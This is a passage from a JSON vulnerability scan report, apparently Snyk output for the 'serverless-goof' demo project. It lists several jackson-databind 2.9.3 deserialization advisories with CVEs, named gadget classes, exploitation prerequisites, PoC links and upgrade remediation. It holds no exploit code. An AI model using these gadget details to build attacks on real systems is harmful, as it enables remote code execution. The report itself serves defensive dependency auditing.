          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:30:54.237288Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-36179)\n",
      "disclosureTime": "2021-01-07T13:30:00Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056421",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36182"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2022-02-09T15:25:00.491347Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:35Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:36:40.536722Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2998)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:34:52Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056424",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36185"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-07T16:40:33.305242Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33.303463Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2998"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:37:54.679882Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2996)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:37:04Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056425",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36189"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-07T16:40:33.091140Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33.089230Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2996"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:39:28.531700Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2996)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-36188)\n",
      "disclosureTime": "2021-01-07T13:38:32Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056426",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36188"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-12T14:26:34.490625Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:32Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2996"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-36188"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:41:09.172252Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [Poc](https://github.com/Al1ex/CVE-2020-36179)\n",
      "disclosureTime": "2021-01-07T13:38:31Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[, 2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056427",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-36181"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-01-11T13:42:40.238292Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:32Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "Poc",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[, 2.9.10.8)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2021-01-18T12:50:16.466618Z",
      "credit": [
        "Yangkun (ICSL)"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. A malicious user could perform a SSRF attack via the `javax.swing` gadget (specifically `javax.swing.JTextPane`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.7 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/7dbf51bf78d157098074a20bd9da39bd48c18e4a)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2854)\n- [GitHub Release](https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.9.10.7)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1916633)\n",
      "disclosureTime": "2021-01-16T00:00:00Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.7)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.7"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1061931",
      "identifiers": {
        "CWE": [
          "CWE-502",
          "CWE-918"
        ],
        "RHSA": [
          "RHSA-1610966837463990"
        ],
        "CVE": [
          "CVE-2021-20190"
        ],
        "GHSA": [
          "GHSA-5949-rw7g-wx7w"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-03-24T14:29:32.605583Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-18T17:23:46Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/7dbf51bf78d157098074a20bd9da39bd48c18e4a"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2854"
        },
        {
          "title": "GitHub Release",
          "url": "https://github.com/FasterXML/jackson-databind/releases/tag/jackson-databind-2.9.10.7"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1916633"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.7)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.7)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
